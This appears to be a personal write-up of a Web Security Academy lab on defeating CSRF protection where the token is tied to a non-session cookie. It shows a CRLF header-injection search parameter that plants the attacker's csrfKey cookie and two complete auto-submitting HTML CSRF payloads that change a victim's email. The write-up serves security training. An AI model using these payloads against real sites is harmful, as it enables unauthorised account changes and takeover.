# [CSRF] Lab: CSRF where token is tied to non-session cookie (1)

---

![Untitled](%5BCSRF%5D%20Lab%20CSRF%20where%20token%20is%20tied%20to%20non-session%208af8447b474e4bb2822f6b4bd3fdfbd7/Untitled.png)

so when we login we have a cookie being set which is normal behavior. 

![Untitled](%5BCSRF%5D%20Lab%20CSRF%20where%20token%20is%20tied%20to%20non-session%208af8447b474e4bb2822f6b4bd3fdfbd7/Untitled%201.png)

so when application uses a non-session cookie to tie together the csrf token this can be dangerous because the attacker can still exploit this vulnerability by finding places where the website sets a cookie and try to set my own csrfKey cookie and provide my own csrf token. 

so by navigating the site then filtering for a search on set-cookie: I was able to find all the requests/response that caused cookies to be set. 

![Untitled](%5BCSRF%5D%20Lab%20CSRF%20where%20token%20is%20tied%20to%20non-session%208af8447b474e4bb2822f6b4bd3fdfbd7/Untitled%202.png)

Sets the setting csrfKey whenever a get request is sent to /login

lets see if I am already logged in and if i request /login what will happen to do this ill simply just use repeater. 

so lets see what happens when the csrfKey is included and when it is removed. 

**csrfKey included:** 

![Untitled](%5BCSRF%5D%20Lab%20CSRF%20where%20token%20is%20tied%20to%20non-session%208af8447b474e4bb2822f6b4bd3fdfbd7/Untitled%203.png)

**csrfKey omitted:**

![Untitled](%5BCSRF%5D%20Lab%20CSRF%20where%20token%20is%20tied%20to%20non-session%208af8447b474e4bb2822f6b4bd3fdfbd7/Untitled%204.png)

it sets a new cookie. 

so lets have the user login with our account to set our own valid cookie in there browser. 

lets see if I make a request to someone else's browser with my session cookie will it set there csrfKey to my csrfKey?

/my-account?id=wiener&Set-Cookie: csrfKey=uHc4SBogXX2dRyQpJ0APikzSxPfSdhy

that didn't work what if we try to go down a line in the response since every thing is being reflected

![Untitled](%5BCSRF%5D%20Lab%20CSRF%20where%20token%20is%20tied%20to%20non-session%208af8447b474e4bb2822f6b4bd3fdfbd7/Untitled%205.png)

so if we use %0A to go down a line then %0D to have the carriage return we can create a new line in the response and set our own cookie lets try it. 

![Untitled](%5BCSRF%5D%20Lab%20CSRF%20where%20token%20is%20tied%20to%20non-session%208af8447b474e4bb2822f6b4bd3fdfbd7/Untitled%206.png)

it worked in here now lets provide our set cookie. 

![Untitled](%5BCSRF%5D%20Lab%20CSRF%20where%20token%20is%20tied%20to%20non-session%208af8447b474e4bb2822f6b4bd3fdfbd7/Untitled%207.png)

so now we can see it work so all we need to do is create a csrf PoC to have user visit this URl: 

![Untitled](%5BCSRF%5D%20Lab%20CSRF%20where%20token%20is%20tied%20to%20non-session%208af8447b474e4bb2822f6b4bd3fdfbd7/Untitled%208.png)

 

**TESTING:**

![Untitled](%5BCSRF%5D%20Lab%20CSRF%20where%20token%20is%20tied%20to%20non-session%208af8447b474e4bb2822f6b4bd3fdfbd7/Untitled%209.png)

so now carlos csrfKey is set to wieners csrfKey

so inorder to pass our form along with our search term we can use a tag like img which can load  our URL without any affect to the URL of the form. 

for our csrf payload becomes: 

```jsx
<html>
  
  <body>
    <form action="https://0a9b00e1033c95968182765700ef0048.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="JTu3KnbYtrF8B18PTYNhiv5f2bcvyfJx" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a9b00e1033c95968182765700ef0048.web-security-academy.net?search=lb155%0D%0ASet-Cookie%3A+csrfKey%3DuHc4SBogXX2dRyQpJ0APikzSxPfSdhy;SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>

```

by using the onerror since no image is going to be found we are able to submit our form rather then using the <script> tags. 

now if we add a unused csrf token this attack and payload should work. 

```jsx
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a9b00e1033c95968182765700ef0048.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="email@email.com" />
      <input type="hidden" name="csrf" value="lIzoh5JasB90Z7AJhU2yw2ICsMaAh9oL" />
      <input type="submit" value="Submit request" />
    </form>
	<img src="https://0a9b00e1033c95968182765700ef0048.web-security-academy.net/?search=/?search=test%0d%0aSet-Cookie:%20csrfKey=3WEnyheMUoZ0ihiuT2VOLI3DbcjvvIRb%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>

```

![Untitled](%5BCSRF%5D%20Lab%20CSRF%20where%20token%20is%20tied%20to%20non-session%208af8447b474e4bb2822f6b4bd3fdfbd7/Untitled%2010.png)